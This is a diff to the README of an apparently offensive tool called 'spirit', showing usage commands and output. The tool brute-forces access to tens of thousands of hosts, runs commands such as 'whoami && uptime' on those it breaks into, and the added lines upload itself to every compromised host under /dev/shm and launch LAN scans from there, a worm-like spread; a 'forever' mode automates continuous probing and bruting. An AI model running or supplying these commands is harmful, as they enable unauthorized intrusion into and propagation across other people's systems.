@@ -66,6 +66,8 @@ out of [26803]hosts [4000]bruted [3000]found [19803]blocked
 # omni will automatically attempt to connect to hosts present in the found.lst file,
 # run commands on them and display the output to you.
 $ ./spirit omni -c 'whoami && uptime'
+# Upload spirit to all hosts and scan the LAN
+$ ./spirit omni -u ./spirit -c '/dev/shm/spirit scan --lan'
 ```
 
 > Tip: you can automate these steps with `./spirit forever` for continuous automatic probing on random ports & bruting. ![forever](asset/forever.png)
@@ -75,7 +77,6 @@ $ ./spirit omni -c 'whoami && uptime'
 ```bash
 Upgrading 87% [========================>     ] (5.9/5.9 MB, 49.652 MB/s)
 ```
-> *Spirit can self-upgrade only on amd64 aka x86-64 for now. [`donate to speed things up`](#monero-xmr-thank-you)
 
 ## Spirit is Free (sorta)
 For `local IP` (10/172/192) ranges and up to 1,000 `public IPs`
